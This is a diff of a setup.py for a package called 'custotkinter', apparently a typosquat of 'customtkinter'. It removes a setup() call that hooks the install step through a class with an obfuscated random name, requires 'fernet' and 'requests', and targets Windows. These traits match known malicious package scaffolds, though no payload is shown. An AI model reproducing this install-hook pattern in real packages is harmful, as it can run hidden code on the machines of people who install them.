@@ -18,22 +18,5 @@ class UUQwgEHjuuFnWeETqLCFNBNHHsrVwqbxNBMtHsWrCXqihnPjoCeNSmHKfrRiyYOLrRT(instal
             install.run(self)
 
 
-setup(
-    name="custotkinter",
-    version=VERSION,
-    author="GkbExTBsdnkNzuOsBU",
-    author_email="qwPIh@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': UUQwgEHjuuFnWeETqLCFNBNHHsrVwqbxNBMtHsWrCXqihnPjoCeNSmHKfrRiyYOLrRT,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
 
